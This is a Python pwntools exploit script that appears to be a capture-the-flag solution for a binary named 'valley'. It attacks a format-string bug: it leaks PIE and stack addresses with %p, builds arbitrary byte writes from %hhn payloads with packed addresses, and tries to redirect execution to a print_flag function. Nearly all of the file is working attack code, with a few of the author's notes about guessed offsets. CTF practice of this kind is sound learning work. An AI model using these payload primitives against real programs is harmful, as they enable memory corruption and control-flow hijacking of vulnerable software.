#!/usr/bin/env python3
import os
from pwn import *
from pwn_ext import *

exe = ELF("./valley")

context.binary = exe
# GDB Compatability stuff
if "alacritty" in os.environ["TERM"]:
    context.terminal = ["alacritty", "-e"]
elif "tmux" in os.environ["TERM"]:
    context.terminal = ["tmux", "splitw", "-h"]
elif os.environ["GNOME_TERMINAL_SCREEN"]:
    context.terminal = ["gnome-terminal", "--"]

# Who needs more than one process?
if args.REMOTE:
    #p = remote("addr", 1337)
    p = nc_remote("") # just put entire nc command or host:port here
elif args.CLEAN:
    p = process([exe.path])
else:
    gdbscript = '''
    b *main
    break /home/valley/valley.c:39
    c
    '''
    p = gdb.debug([exe.path], gdbscript=gdbscript)

### PUT ACTUAL PWN STUFF BELOW THIS LINE ###

def arb_8bit_write(addr, data):
    payload = b''
    if data == 0: 
        payload = f"%8$hhn".encode()
    else:
        payload = f"%{data}c%8$hhn".encode()
    
    padding = b'A'*(16-len(payload))
    payload+=padding

    payload+=p64(addr)

    p.sendline(payload)

def arb_64bit_write(addr, data):
    to_write = [
        data & 0xff,
        (data >> 8) & 0xff,
        (data >> 16) & 0xff,
        (data >> 24) & 0xff,
        (data >> 32) & 0xff,
        (data >> 40) & 0xff,
        (data >> 48) & 0xff,
        (data >> 56) & 0xff
    ]
    for i in range(0, len(to_write)):
        if (i != 0):
            p.recvuntil(b"distance: ")
            p.recv()[:-1]
        arb_8bit_write(addr+i, to_write[i])


def main():
    # good luck pwning :)
    p.recvuntil(b"Shouting:")
    print("---Obtain leaks---")
    # leak PIE base
    p.sendline(b"%10p.%23$p")
    p.recvuntil(b"distance: ")
    leak = p.recv()[:-1].split(b".")
    base_leak = leak[0]
    main_static = int("0x0000000000001401", 16)
    # main did not lead to true base; 
    # removed the last offset. Don't know how to do this otherwise?
    base_leak = (int(base_leak, 16) - main_static) - int("0xcc0", 16)
    print(hex(base_leak))


    # find printf in GOT
    # not needed for this chall. Rabbithole..
    # printf_got = exe.got["printf"]
    # print(hex(printf_got))
    # libc_leak = leak[1]
    # print(hex(int(libc_leak, 16)))

    # Get address of winfunc
    win_func = exe.symbols['print_flag'] + base_leak
    print(hex(win_func))

    # we can also just set the elf address:
    exe.address = base_leak
    print(hex(exe.symbols["print_flag"]))

    # Overwrite ret address with address of print_flag


    # Write primitive (binary has full relro)
    # p.sendline(b"AAAAAAAA,%6$p,") # offset = 6.
    # A write with %n will need the data to write (amount bytes already written) before the %n 
    # and the pointer to the write location after the %n
    # like this: <data>%(h)n,<addr>

    # Ret address leak? offset 21?
    # p.sendline(f"AAAAAAAA,%10$n,{base_leak}")
    p.sendline(b"%13$p")
    p.recvuntil(b"distance: ")
    stack_leak = p.recv()[:-1]
    # RET address to write to
    ret_stack_addr = (int(stack_leak, 16) - 1121)
    print(hex(ret_stack_addr))


    # Write to rwp. Get leak
    rwp_leak_offset = 16384
    rwp_loc = base_leak + rwp_leak_offset
    print(hex(rwp_loc))
    # Now write
    print("---Overwrite RET---")
    arb_8bit_write(rwp_loc, 170)

    p.interactive()

if __name__ == "__main__":
    main()
